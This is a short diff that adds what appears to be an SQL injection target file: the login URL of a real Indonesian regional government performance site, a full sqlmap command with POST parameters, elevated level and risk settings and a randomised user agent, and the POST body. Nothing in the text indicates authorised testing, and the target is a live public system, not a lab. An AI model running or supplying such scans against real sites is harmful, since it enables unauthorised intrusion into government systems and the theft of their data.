@@ -1,0 +1,3 @@
+https://kinerja.acehbaratdayakab.go.id/frend/login (POST)  # /opt/homebrew/bin/sqlmap -u https://kinerja.acehbaratdayakab.go.id/frend/login --data=loguser=admin&logpass=test&login=1 --batch --level=3 --risk=2 --random-agent --output-dir=./sqlmap_output
+
+loguser=admin&logpass=test&login=1
